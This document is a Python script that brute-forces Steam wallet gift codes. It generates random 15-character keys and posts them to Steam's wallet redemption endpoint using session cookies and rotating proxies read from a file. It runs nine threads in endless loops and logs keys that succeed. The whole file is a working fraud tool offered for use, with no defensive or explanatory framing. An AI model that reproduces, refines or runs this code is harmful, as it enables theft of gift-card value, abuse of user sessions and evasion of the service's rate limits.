import requests
import random, string
import time
import threading

def MarlBoro(cookiee,sessionid,proxy):
        try:
                x1 = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(5))
                x2 = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(5))
                x3 = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(5))
                key = str(x3) + "-" + str(x2) + "-" +str(x1)
                #print(key)
                
                #print(cookiee)
                #print(sessionid)
                proxies = {
                  "http": "http://"+ str(proxy),
                  "https": "http://"+ str(proxy),
                }
                r = requests.post("https://store.steampowered.com/account/createwalletandcheckfunds/",data={'wallet_code': key, 'CreateFromAddress': 1, 'Address': 'cyka blyat', 'City': 'GGG', 'Country': 'GB', 'State': 'sss', 'PostCode': '16516', 'sessionid': sessionid},headers={"Host":"store.steampowered.com","Connection": "keep-alive","Content-Length": "127","Accept": "text/javascript, text/html, application/xml, text/xml, */*","X-Prototype-Version": "1.7","Origin": "https://store.steampowered.com","X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36","Content-type": "application/x-www-form-urlencoded; charset=UTF-8","Referer": "https://store.steampowered.com/account/redeemwalletcode/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7","Cookie": cookiee}, proxies = proxies)
                #print r.text
                if "success_message" in r.text:
                    f= open("working99.txt","a+")
                    print "working " + key
                    f.write(str(key) + "\n")
                    f.close()

                    #print("DD")
        except Exception as e:
                MarlBoro(cookiee,sessionid,proxy)
                
                
            
main_accs = []
infile = open('guru99.txt','r')
for line in infile:
        data = line.strip()
        #print data
        main_accs.append(data)

naccs = len(main_accs)
def Manichino(gglen):
    i = 0
    while True:
        #data = line.strip()
        #print data
        if i == gglen:  
            infile.seek(0)
            i = 0
        if i > gglen:  
            infile.seek(0)
            i = 0
        data = main_accs[i]
        #main_url.append(currentAcc)
        cookiee = data.split("~")[0]
        sessionid = data.split("~")[1]
        proxy = data.split("~")[2]
        sessionid = sessionid.replace('"','')
        #print(sessionid)
        #time.sleep(1)
        i = i + 1
        MarlBoro(cookiee,sessionid,proxy)
        if i == gglen:  
            infile.seek(0)
            i = 0
        #print(i)
        #print(gglen)
        


def file_len(fname):
    with open(fname) as f:
        for i, l in enumerate(f):
            pass
    return i + 1

gglen = file_len('guru99.txt')

z=0
#accsn = len(main_accs)
#print(accsn)
#print(accsn)
thr = []
while z < 9:

        
        thr.append(threading.Thread(target=Manichino, args=(gglen,)))
        thr[z].start()
        z = z+1
        
    
        #print atn
        #print(acctocheck)
    #    thr.append(threading.Thread(target=checkaccs, args=(acctocheck,)))
    #    thr[z].start()
     #   z = z+1

           
#Manichino(gglen)
    


